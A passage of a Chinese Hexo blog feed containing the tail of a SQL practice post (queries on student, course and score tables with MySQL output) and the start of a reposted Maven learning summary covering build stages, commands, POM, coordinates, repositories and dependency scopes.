  <span class="params">| 01   |</span>  <span class="number">80.0</span> <span class="params">|         1 |</span></span><br><span class="line"><span class="params">| 03   |</span> <span class="number">01</span>   <span class="params">|  80.0 |</span>         <span class="number">1</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 01   |</span>  <span class="number">76.0</span> <span class="params">|         3 |</span></span><br><span class="line"><span class="params">| 01   |</span> <span class="number">02</span>   <span class="params">|  90.0 |</span>         <span class="number">1</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 02   |</span>  <span class="number">89.0</span> <span class="params">|         2 |</span></span><br><span class="line"><span class="params">| 05   |</span> <span class="number">02</span>   <span class="params">|  87.0 |</span>         <span class="number">3</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 03   |</span>  <span class="number">99.0</span> <span class="params">|         1 |</span></span><br><span class="line"><span class="params">| 07   |</span> <span class="number">03</span>   <span class="params">|  98.0 |</span>         <span class="number">2</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">02</span>   <span class="params">| 03   |</span>  <span class="number">80.0</span> <span class="params">|         3 |</span></span><br><span class="line"><span class="params">| 03   |</span> <span class="number">03</span>   <span class="params">|  80.0 |</span>         <span class="number">3</span> <span class="params">|</span></span><br><span class="line"><span class="params">+------+------+-------+-----------+</span></span><br><span class="line"><span class="params">10 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>20. 查询出只选修两门课程的学生学号和姓名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.sid, s.sname, <span class="keyword">count</span>(cid)</span><br><span class="line"><span class="keyword">from</span> student s, sc</span><br><span class="line"><span class="keyword">where</span> s.sid = sc.sid</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> s.sid</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">count</span>(cid)=<span class="number">2</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+------------+</span><br><span class="line"><span class="params">| sid  |</span> sname  <span class="params">| count(cid) |</span></span><br><span class="line">+------+--------+------------+</span><br><span class="line"><span class="params">| 05   |</span> 周梅   <span class="params">|          2 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">|          2 |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">|          2 |</span></span><br><span class="line">+------+--------+------------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>22. 查询名字中含有「风」字的学生信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%风%&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>24. 查询 1990 年出生的学生名单</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">year</span>(sage) = <span class="number">1990</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 08   <span class="params">| 王菊   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">5</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>33. 成绩不重复，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select s.*, <span class="built_in">max</span>(score)</span><br><span class="line">from student s, teacher t, course <span class="built_in">c</span>, sc</span><br><span class="line"><span class="keyword">where</span> s.sid = sc.sid</span><br><span class="line">    and sc.cid = <span class="built_in">c</span>.cid</span><br><span class="line">    and <span class="built_in">c</span>.tid = t.tid</span><br><span class="line">    and t.tname = &#x27;张三&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+------------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">| max(score) |</span></span><br><span class="line">+------+--------+---------------------+------+------------+</span><br><span class="line"><span class="params">| 01   |</span> 赵雷   <span class="params">| 1990-01-01 00:00:00 |</span> 男   <span class="params">|       90.0 |</span></span><br><span class="line">+------+--------+---------------------+------+------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>34. 成绩有重复的情况下，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (</span><br><span class="line">    <span class="keyword">select</span> *, <span class="keyword">DENSE_RANK</span>() <span class="keyword">over</span> (<span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) A</span><br><span class="line">    <span class="keyword">from</span> SC</span><br><span class="line">    <span class="keyword">where</span> Cid = (<span class="keyword">select</span> Cid <span class="keyword">from</span> Course <span class="keyword">where</span> Tid=(<span class="keyword">select</span> Tid <span class="keyword">from</span> Teacher <span class="keyword">where</span> Tname=<span class="string">&#x27;张三&#x27;</span>))</span><br><span class="line">) B</span><br><span class="line"><span class="keyword">where</span> B.A=<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+------+-------+---+</span><br><span class="line"><span class="params">| Sid  |</span> Cid  <span class="params">| score |</span> A <span class="params">|</span></span><br><span class="line"><span class="params">+------+------+-------+---+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 02   |</span>  <span class="number">90.0</span> <span class="params">| 1 |</span></span><br><span class="line">+------+------+-------+---+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>40. 查询各学生的年龄，只按年份来算</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname, <span class="keyword">year</span>(<span class="keyword">now</span>())-<span class="keyword">year</span>(sage) <span class="keyword">as</span> age <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+--------+------+</span><br><span class="line"><span class="params">| sname  |</span> age  <span class="params">|</span></span><br><span class="line"><span class="params">+--------+------+</span></span><br><span class="line"><span class="params">|</span> 赵雷   <span class="params">|   28 |</span></span><br><span class="line"><span class="params">| 钱电   |</span>   <span class="number">28</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 孙风   <span class="params">|   28 |</span></span><br><span class="line"><span class="params">| 李云   |</span>   <span class="number">28</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 周梅   <span class="params">|   27 |</span></span><br><span class="line"><span class="params">| 吴兰   |</span>   <span class="number">26</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 郑竹   <span class="params">|   29 |</span></span><br><span class="line"><span class="params">| 王菊   |</span>   <span class="number">28</span> <span class="params">|</span></span><br><span class="line"><span class="params">+--------+------+</span></span><br><span class="line"><span class="params">8 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>41. 按照出生日期来算，当前月日 &lt; 出生年月的月日则，年龄减一</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname, <span class="keyword">timestampdiff</span>(<span class="keyword">year</span>, sage, <span class="keyword">now</span>()) <span class="keyword">as</span> age <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+--------+------+</span><br><span class="line"><span class="params">| sname  |</span> age  <span class="params">|</span></span><br><span class="line"><span class="params">+--------+------+</span></span><br><span class="line"><span class="params">|</span> 赵雷   <span class="params">|   28 |</span></span><br><span class="line"><span class="params">| 钱电   |</span>   <span class="number">27</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 孙风   <span class="params">|   28 |</span></span><br><span class="line"><span class="params">| 李云   |</span>   <span class="number">27</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 周梅   <span class="params">|   26 |</span></span><br><span class="line"><span class="params">| 吴兰   |</span>   <span class="number">26</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> 郑竹   <span class="params">|   29 |</span></span><br><span class="line"><span class="params">| 王菊   |</span>   <span class="number">28</span> <span class="params">|</span></span><br><span class="line"><span class="params">+--------+------+</span></span><br><span class="line"><span class="params">8 rows <span class="keyword">in</span> set (0.00 sec)  </span></span><br></pre></td></tr></table></figure><p><strong>42. 查询本周过生日的学生</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">week</span>(<span class="keyword">now</span>()) = <span class="keyword">week</span>(sage)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Empty <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>43. 查询下周过生日的学生</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> (<span class="keyword">week</span>(<span class="keyword">now</span>())+<span class="number">1</span>) = <span class="keyword">week</span>(sage)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>44. 查询本月过生日的学生</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">month</span>(<span class="keyword">now</span>()) = <span class="keyword">month</span>(sage)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 郑竹   |</span> <span class="number">1989</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>45. 查询下月过生日的学生</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> (<span class="keyword">month</span>(<span class="keyword">now</span>())+<span class="number">1</span>) = <span class="keyword">month</span>(sage)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-Maven学习总结</title>
      <link href="/archives/eec6c405.html"/>
      <url>/archives/eec6c405.html</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p>本文转载自：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p4bTEzMDYxOTI5ODgvYXJ0aWNsZS9kZXRhaWxzLzc2MjA5MDYy" title="https://blog.csdn.net/zxm1306192988/article/details/76209062">https://blog.csdn.net/zxm1306192988/article/details/76209062<i class="fa fa-external-link"></i></span></p><p>对应学习视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2MzY1NTc3NjM/ZnJvbT1zZWFyY2gmYW1wO3NlaWQ9MTE3NjE2NzgxMjg5OTU3OTM2NDQ=" title="https://www.bilibili.com/video/av36557763?from=search&amp;seid=11761678128995793644">https://www.bilibili.com/video/av36557763?from=search&amp;seid=11761678128995793644<i class="fa fa-external-link"></i></span></p><p>hexo 渲染 尖括号有问题，直看github好了:</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L3JhdmVueHJ6LmdpdGh1Yi5pby9ibG9iL21hc3Rlci9zb3VyY2UvX3Bvc3RzLyVFOCVCRCVBQyVFOCVCRCVCRC1NYXZlbiVFNSVBRCVBNiVFNCVCOSVBMCVFNiU4MCVCQiVFNyVCQiU5My5tZA==" title="https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/%E8%BD%AC%E8%BD%BD-Maven%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.md">https://github.com/ravenxrz/ravenxrz.github.io/blob/master/source/_posts/%E8%BD%AC%E8%BD%BD-Maven%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.md<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1、目前掌握的技术"><a href="#1、目前掌握的技术" class="headerlink" title="1、目前掌握的技术"></a>1、目前掌握的技术</h2><p><img data-src="https://i.loli.net/2020/03/16/maU62WsxeNDkYJf.png" alt="这里写图片描述"></p><h2 id="2、目前的技术在开发中存在的问题-why"><a href="#2、目前的技术在开发中存在的问题-why" class="headerlink" title="2、目前的技术在开发中存在的问题[why]"></a>2、目前的技术在开发中存在的问题[why]</h2><ol><li><p><strong>一个项目就是一个工程</strong><br>如果项目非常庞大，就不适合继续使用package来划分模块。最好是每一个模块对应一个项目，利于分工协作。<br>借助于maven就可以将一个项目拆分成多个工程。</p></li><li><p><strong>项目中需要的jar包必须手动“复制”、”粘贴” 到WEB-INF/lib 项目下</strong><br>带来的问题：同样的jar包文件重复出现在不同的项目工程中，一方面浪费存储空间，另外也让工程比较臃肿。<br>借助Maven，可以将jar包仅仅保存在“仓库”中，有需要使用的工程“引用”这个文件，并不需要重复复制。</p></li><li><p><strong>jar包需要别人替我们准备好，或到官网下载</strong><br>所有知名框架或第三方工具jar包已经按照统一规范放在了Maven的中央仓库中。</p></li><li><p><strong>一个jar包依赖的其他jar包需要自己手动加到项目中</strong><br>Maven会自动将被依赖的jar包导入进来。</p></li></ol><h2 id="3、Maven是什么-what"><a href="#3、Maven是什么-what" class="headerlink" title="3、Maven是什么[what]"></a>3、Maven是什么[what]</h2><ol><li><p>Maven 是 Apache 软件基金会组织维护的一款自动化构建工具，专注服务于 Java 平台的项目构建和依赖管理 。Maven 这个单词的本意是：专家，内行。读音是[‘meɪv(ə)n]或[‘mevn]。<br>构建工具的发展：Make→Ant→Maven→Gradle</p></li><li><p>构建：就是以我们编写的Java代码、框架配置文件、国际化等其他资源文件、jsp页面和图片等静态资源作为“原材料”，去“生产”出一个可以运行的项目的过程。</p></li></ol><p>eclipse中的项目与tomcat中编译结果对比：</p><p><img data-src="https://i.loli.net/2020/03/16/ya1UQPVIScnh6Zk.png" alt="这里写图片描述"></p><h2 id="4-构建过程中的几个主要环节"><a href="#4-构建过程中的几个主要环节" class="headerlink" title="4. 构建过程中的几个主要环节"></a>4. 构建过程中的几个主要环节</h2><p>①清理：删除以前的编译结果，为重新编译做好准备。<br>②编译：将Java源程序编译为字节码文件。<br>③测试：针对项目中的关键点进行测试，确保项目在迭代开发过程中关键点的正确性。<br>④报告：将每一次测试后以标准的格式记录和展示测试结果。<br>⑤打包：将一个包含诸多文件的工程封装为一个压缩文件用于安装或部署。Java工程对应jar包，Web工程对象war包。<br>⑥安装：在Maven环境下特指将打包的结果——Jar包或War包安装到本地仓库中。<br>⑦部署：将打包的结果部署到远程仓库或将war包部署到服务器上运行。</p><h2 id="5、Maven的核心概念"><a href="#5、Maven的核心概念" class="headerlink" title="5、Maven的核心概念"></a>5、Maven的核心概念</h2><ol><li>约定的目录结构</li><li>POM</li><li>坐标</li><li>依赖</li><li>仓库</li><li>生命周期/插件/目标</li><li>继承</li><li>聚合</li></ol><h2 id="6、第一个Maven工程"><a href="#6、第一个Maven工程" class="headerlink" title="6、第一个Maven工程"></a>6、第一个Maven工程</h2><ol><li>创建约定的目录结构</li></ol><p><img data-src="https://i.loli.net/2020/03/16/F5CYezJw72ZsmTG.png" alt="这里写图片描述"></p><ol start="2"><li>为什么要遵循约定的目录结构呢？<br>我们在开发中如果需要让第三方工具或框架知道我们自己创建的资源在哪，那么基本上就是两种方式：<br>①以配置文件的方式明确告诉框架 如 &lt; param-value&gt;classpath:spring-context.xml &lt; /param-value&gt;<br>②遵循框架内部已经存在的约定 如log4j的配置文件名规定必须为 log4j.properties 或 log4j.xml ；Maven 使用约定的目录结构</li></ol><h2 id="7、Maven常用命令"><a href="#7、Maven常用命令" class="headerlink" title="7、Maven常用命令"></a>7、Maven常用命令</h2><p>注意：执行与构建过程相关的Maven命令，必须进入pom.xml 所在的目录。<br>常用命令<br>【1】mvn clean : 清理<br>【2】mvn compile : 编译主程序<br>【3】mvn test-compile : 编译测试程序<br>【4】mvn test : 执行测试<br>【5】mvn package : 打包<br>【6】mvn install ： 安装<br>【7】mvn site ：生成站点</p><h2 id="8、关于联网问题"><a href="#8、关于联网问题" class="headerlink" title="8、关于联网问题"></a>8、关于联网问题</h2><p>Maven 的核心程序中仅仅定义了抽象的生命周期，但是具体的工作必须有特定的插件来完成。而插件本身不包含在Maven核心程序中。</p><p>当我们执行的Maven命令需要用到某些插件时，Maven核心程序会首先到本地仓库中查找。<br>本地仓库的默认位置：[系统登陆用户的家目录] \ .m2\repository</p><p>Maven核心程序如果在本地仓库中找不到需要的插件，那么它会自动连接外网，到中央仓库下载。<br>如果此时无法连接外网，则构建失败。</p><p>修改默认本地仓库的位置可以让Maven核心程序到我们事先准备好的目录下查找插件<br>①找到Maven解压目录\conf\settings.xml<br>②在setting.xml 文件中找到 localRepository 标签<br>③将 &lt; localRepository&gt;/path/to/local/repo&lt; /localRepository&gt;从注释中取出<br>④将标签体内容修改为自定义的Maven仓库目录</p><h2 id="9、POM"><a href="#9、POM" class="headerlink" title="9、POM"></a>9、POM</h2><p>含义：Project Object Model 项目对象模型<br>DOM ：Document Object Model 文档对象模型</p><p>pom.xml 对于 Maven工程是核心配置文件，与构建过程相关的一切设置都在这个文件中进行配置。<br>重要程度相当于web.xml 对于动态web工程</p><h2 id="10、坐标"><a href="#10、坐标" class="headerlink" title="10、坐标"></a>10、坐标</h2><p>数学中的坐标：<br>①在平面中，使用X,Y坐标可以唯一的定位平面中任何一个点。<br>②在空间中，使用X,Y，Z三个向量可以唯一的定位空间中的任何一个点。</p><p>Maven的坐标：<br>使用下面三个向量在仓库中唯一定位一个Maven工程</p><p>①groupid:公司或组织域名倒序+项目名</p><p><code>&lt; groupid&gt;com.atguigu.maven&lt; /groupid&gt;</code></p><p>②artifactid:模块名</p><p><code>&lt; artifactid&gt;Hello&lt; /artifactid&gt;</code></p><p>③version：版本</p><p><code>&lt; version&gt;1.0.0&lt; /version&gt;</code><br>Maven 工程的坐标与仓库中路径的对应关系，以spring为例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt; <span class="attr">groupId</span>&gt;</span>org.springframework<span class="tag">&lt; /<span class="attr">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt; <span class="attr">artifactId</span>&gt;</span>spring-core<span class="tag">&lt; /<span class="attr">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt; <span class="attr">version</span>&gt;</span>4.0.0.RELEASE<span class="tag">&lt; /<span class="attr">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">org/springframework/spring-core/4.0.0.RELEASE/spring-core-4.0.0.RELEASE.jar</span><br></pre></td></tr></table></figure><h2 id="11、仓库"><a href="#11、仓库" class="headerlink" title="11、仓库"></a>11、仓库</h2><ol><li><p>仓库的分类<br>①本地仓库：当前电脑上部署的仓库目录，为当前电脑上所有Maven工程服务</p><p><img data-src="https://i.loli.net/2020/03/16/kWGmxiC4sXcDIjA.png" alt="这里写图片描述"></p><p>②远程仓库<br>（1）私服：搭建在局域网环境中，为局域网范围内的所有Maven工程服务</p></li></ol><p>（2）中央仓库：假设在Internet上，为全世界所有Maven工程服务</p><p>（3）中央仓库镜像：为了分担中央仓库流量，提升用户访问速度</p><ol start="2"><li>仓库中保存的内容：Maven工程<br>①Maven自身所需要的插件<br>②第三方框架或工具的jar包<br>③我们自己开发的Maven工程</li></ol><h2 id="12、依赖"><a href="#12、依赖" class="headerlink" title="12、依赖"></a>12、依赖</h2><h3 id="本地依赖"><a href="#本地依赖" class="headerlink" title="本地依赖"></a>本地依赖</h3><p>当 A jar 包用到了 B jar 包中的某些类时，A 就对 B 产生了依赖，这是概念上的描述。Maven解析依赖信息时会到仓库中查找被依赖的jar包。<br>对于我们自己开发的Maven工程，要使用mvn install 命令安装后就可以进入仓库。</p><p><img data-src="https://i.loli.net/2020/03/16/d3rGlmeD6ELfRcy.png" alt="这里写图片描述"></p><h3 id="依赖的范围"><a href="#依赖的范围" class="headerlink" title="依赖的范围"></a>依赖的范围</h3><p>①从项目结构角度理解compile和test的区别</p><p><img data-src="https://i.loli.net/2020/03/16/brKRtiZoMkmX4Yv.png" alt="这里写图片描述"></p><p>compile范围依赖<br>》对主程序是否有效：有效<br>》对测试程序是否有效：有效<br>》是否参与打包：参与<br>》是否参与部署：参与<br>》典型例子：spring-core</p><p>test范围依赖<br>》对主程序是否有效：无效<br>》对测试程序是否有效：有效<br>》是否参与打包：不参与<br>》是否参与部署：不参与<br>》典型例子：Junit</p><p>②从开发和运行这两个阶段理解compile 和 provided 的区别</p><p><img data-src="https://i.loli.net/2020/03/16/AcjXCSOn6FRyl1T.png" alt="这里写图片描述"></p><p>》对主程序是否有效：有效<br>》对测试程序是否有效：有效<br>》是否参与打包：不参与<br>》是否参与部署：不参与<br>》典型例子：Servlet-api.jar</p><ol><li>各个构建环节执行的顺序：不能打乱顺序，必须按照既定的正确顺序来执行。</li><li>Maven的核心程序中定义了抽象的生命周期，生命周期中各个阶段的具体任务是由插件来完成的。</li><li>Maven核心程序为了更好的实现自动化构建，按照这一特点执行生命周期中各个阶段：<strong>不论现在要执行生命周期中的哪一阶段，都是从这个生命周期最初的位置开始执行。</strong></li></ol><p>Maven的核心仅仅定义了抽象的声明周期，具体的任务都是交由插件完成的。每个插件都实现多个功能，每个功能就是一个插件目标Maven的生命周期与插件目标相互绑定，以完成某个具体的构建任务。<br>可以将目标看做“调用插件功能的命令”</p><p>例如：compile 就是插件 maven-compiler-plugin 的一个目标；pre-clean 是插件 maven-clean-plugin 的一个目标。</p><table><thead><tr><th>生命周期的各个阶段</th><th>插件目标</th><th>插件</th></tr></thead><tbody><tr><td>compile</td><td>compile</td><td>maven-compiler-plugin:3.1</td></tr><tr><td>test-compile</td><td>testCompile</td><td>maven-compiler-plugin:3.1</td></tr></tbody></table><p>有效性总结：</p><p><img data-src="https://i.loli.net/2020/03/16/BvFaxJyAe45R3LW.png" alt="这里写图片描述"></p><h3 